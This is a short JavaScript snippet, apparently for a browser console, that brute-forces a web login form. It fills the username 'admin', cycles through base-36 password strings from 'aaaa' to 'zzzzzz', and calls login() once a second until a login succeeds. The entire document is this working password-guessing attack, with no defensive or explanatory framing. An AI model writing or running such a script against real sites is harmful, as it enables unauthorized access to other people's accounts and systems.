function attemptLoginWithDelay(startIndex, endIndex, delay) {
    var index = startIndex;
    var intervalId = setInterval(function() {
        if (index <= endIndex && !isLoggedIn) {
            document.getElementById('username').value = 'admin';
            document.getElementById('password').value = index.toString(36);
            console.log(document.getElementById('password').value);
            login();
            index++;
        } else {
            clearInterval(intervalId);
        }
    }, delay);
}

// Start the login attempts with a delay of 1 second between each attempt
attemptLoginWithDelay(parseInt("aaaa", 36), parseInt("zzzzzz", 36), 1000);